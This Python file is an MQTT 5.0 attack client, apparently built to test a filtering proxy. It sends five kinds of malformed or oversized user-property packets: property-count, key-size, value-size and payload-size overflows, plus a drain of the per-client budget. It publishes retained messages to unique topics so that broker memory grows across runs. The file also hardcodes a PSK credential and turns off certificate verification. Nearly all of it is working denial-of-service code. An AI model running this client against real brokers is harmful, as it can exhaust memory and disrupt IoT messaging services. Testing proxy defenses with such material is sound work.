"""
user_property_attack/attack_client.py
Multi-vector MQTT 5.0 User Property attack client.

Each run sends packets that target one of 5 distinct proxy rules:

  VT-1 (count overflow)   – 25-40 properties × 2 KB values per packet  → Rule 1
                            Uses retain=True + unique topic → accumulates
                            ~65 KB of retained data per packet in broker
  VT-2 (key overflow)     – key > 256 bytes                             → Rule 2
  VT-3 (value overflow)   – single value 5-10 KB                       → Rule 3
                            Uses retain=True → accumulates per packet
  VT-4 (payload overflow) – 10 props × key≈220B + val≈230B > 4096 B    → Rule 4
                            Uses retain=True → accumulates per packet
  VT-5 (budget exhaust)   – 7-8 props × (80B key + 100B val) ≈ 1260 B  → Rule 5
                            32 KB budget exhausted after ~26 packets;
                            remaining 4-24 packets of each iteration dropped
                            Uses retain=True → accumulates forwarded packets

All attack packets publish to UNIQUE per-iteration/per-packet topics
(e.g. atk/cnt/iter3/pkt7) so retained messages do NOT overwrite each other
and vulnerable broker memory grows continuously across all 20 iterations.

STDOUT (single comma-separated line):
  normal_sent,vt1_sent,vt2_sent,vt3_sent,vt4_sent,vt5_sent
"""

import argparse
import random
import sys
import time
import threading

import paho.mqtt.client as mqtt
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes
import ssl

# ---------------------------------------------------------------------------
# Packet-count ranges per vector
# ---------------------------------------------------------------------------
NORMAL_RANGE = (3, 10)    # legitimate packets — no retain
VT1_RANGE    = (5, 15)    # count overflow     — retain, 25-40 props × 2 KB values
VT2_RANGE    = (2, 10)    # key-size overflow  — no retain (key violations ≠ big payload)
VT3_RANGE    = (2, 10)    # value-size overflow— retain, 5-10 KB per packet
VT4_RANGE    = (3,  8)    # payload overflow   — retain, ~4.5 KB per packet
VT5_RANGE    = (30, 50)   # budget exhaustion  — retain, ~1260 B/pkt; budget of 32 KB
                           # exhausted at ~26 packets → 4-24 of these are dropped

# PSK credentials (used only when --tls-psk is given)
PSK_ID  = "client1"
PSK_KEY = "0123456789abcdef"

# ---------------------------------------------------------------------------
# Payload builders
# (all return a list of (key, value) tuples — caller adds retain/topic)
# ---------------------------------------------------------------------------

def _props_count_overflow():
    """VT-1: 25-40 properties × 2 KB values → ~60 KB payload per packet."""
    n = random.randint(25, 40)
    val = "X" * 2048
    return [(f"atk{i:03d}", val) for i in range(n)]


def _props_key_overflow():
    """VT-2: one property whose key exceeds 256 bytes."""
    key_len = random.randint(300, 600)
    return [("K" * key_len, "normal_value")]


def _props_value_overflow():
    """VT-3: one property whose value is 5-10 KB (violates 256-byte limit)."""
    val_len = random.randint(5120, 10240)
    return [("normal_key", "V" * val_len)]


def _props_payload_overflow():
    """
    VT-4: count=10, each key ≤256 and val ≤256, but total > 4096 bytes.
    key≈220B + val≈230B = 450B each × 10 = 4500B.
    """
    count = 10
    props = []
    for i in range(count):
        k = random.randint(205, 240)
        v = random.randint(205, 240)
        props.append(("K" * k, "V" * v))
    return props


def _props_budget_packet():
    """
    VT-5: individually-OK packet that drains the 32 KB per-client budget.
    7-8 properties × (80B key + 100B val) ≈ 1260 B per packet.
    Budget = 32768 B → exhausted after ≈ 26 packets.
    With VT5_RANGE = (30-50), every iteration overflows the budget.
    """
    count = random.randint(7, 8)
    props = []
    for _ in range(count):
        k = random.randint(75, 90)   # ~82 B key — within 256 B limit
        v = random.randint(90, 115)  # ~102 B val — within 256 B limit
        props.append(("k" * k, "v" * v))
    return props


# ---------------------------------------------------------------------------
# Publish helper
# ---------------------------------------------------------------------------

_pkt_seq = 0   # global packet sequence for unique topic suffixes

def _publish(client, props_list, topic, retain=False):
    """Publish to a unique topic with the given user-property list."""
    global _pkt_seq
    _pkt_seq += 1
    props = Properties(PacketTypes.PUBLISH)
    for key, val in props_list:
        props.UserProperty = (key, val)
    client.publish(topic, payload=f"seq={_pkt_seq}", qos=0,
                   retain=retain, properties=props)


# ---------------------------------------------------------------------------
# TLS-PSK context
# ---------------------------------------------------------------------------

def _psk_context():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_psk_client_callback(
        lambda hint: (PSK_ID.encode(), bytes.fromhex(PSK_KEY))
    )
    return ctx


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host",      default="localhost")
    parser.add_argument("--port",      type=int, default=1883)
    parser.add_argument("--tls-psk",   action="store_true",
                        help="Connect via TLS-PSK proxy (port 8883)")
    parser.add_argument("--iteration", type=int, default=1,
                        help="Iteration number — embedded in retain topics for uniqueness")
    args = parser.parse_args()

    random.seed()

    it = args.iteration   # short alias for topic naming

    # Draw random packet counts for this iteration
    n_normal = random.randint(*NORMAL_RANGE)
    n_vt1    = random.randint(*VT1_RANGE)
    n_vt2    = random.randint(*VT2_RANGE)
    n_vt3    = random.randint(*VT3_RANGE)
    n_vt4    = random.randint(*VT4_RANGE)
    n_vt5    = random.randint(*VT5_RANGE)

    connected = threading.Event()

    def on_connect(client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            connected.set()
        else:
            print(f"  Connection failed: {reason_code}", file=sys.stderr)

    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
        protocol=mqtt.MQTTv5,
        client_id=f"attacker-{random.randint(1000, 9999)}",
    )
    client.on_connect = on_connect

    if args.tls_psk:
        client.tls_set_context(_psk_context())

    try:
        client.connect(args.host, args.port)
    except Exception as e:
        print(f"  Connect error: {e}", file=sys.stderr)
        print("0,0,0,0,0,0")
        return

    client.loop_start()

    if not connected.wait(timeout=5):
        print("  Connection timeout", file=sys.stderr)
        print("0,0,0,0,0,0")
        client.loop_stop()
        return

    pkt = 0   # per-client packet counter for unique topics

    # --- Normal traffic (no retain, small properties) ---
    for _ in range(n_normal):
        props = [(f"key{i}", f"val{i}") for i in range(random.randint(1, 5))]
        _publish(client, props, topic=f"normal/iter{it}/p{pkt}")
        pkt += 1
        time.sleep(0.005)

    # --- VT-1: count overflow — retain=True, unique topic per packet ---
    for _ in range(n_vt1):
        _publish(client, _props_count_overflow(),
                 topic=f"atk/cnt/iter{it}/p{pkt}", retain=True)
        pkt += 1
        time.sleep(0.005)

    # --- VT-2: key overflow — no retain (small payload, just violates key rule) ---
    for _ in range(n_vt2):
        _publish(client, _props_key_overflow(),
                 topic=f"atk/key/iter{it}/p{pkt}", retain=False)
        pkt += 1
        time.sleep(0.005)

    # --- VT-3: value overflow — retain=True, unique topic per packet (5-10 KB each) ---
    for _ in range(n_vt3):
        _publish(client, _props_value_overflow(),
                 topic=f"atk/val/iter{it}/p{pkt}", retain=True)
        pkt += 1
        time.sleep(0.005)

    # --- VT-4: payload overflow — retain=True, ~4.5 KB per packet ---
    for _ in range(n_vt4):
        _publish(client, _props_payload_overflow(),
                 topic=f"atk/pay/iter{it}/p{pkt}", retain=True)
        pkt += 1
        time.sleep(0.005)

    # --- VT-5: budget exhaustion — retain=True, ~1260 B per packet ---
    for _ in range(n_vt5):
        _publish(client, _props_budget_packet(),
                 topic=f"atk/bgt/iter{it}/p{pkt}", retain=True)
        pkt += 1
        time.sleep(0.005)

    time.sleep(0.5)
    client.loop_stop()
    try:
        client.disconnect()
    except Exception:
        pass

    # Report to run.sh via stdout (single comma-separated line)
    print(f"{n_normal},{n_vt1},{n_vt2},{n_vt3},{n_vt4},{n_vt5}")


if __name__ == "__main__":
    main()
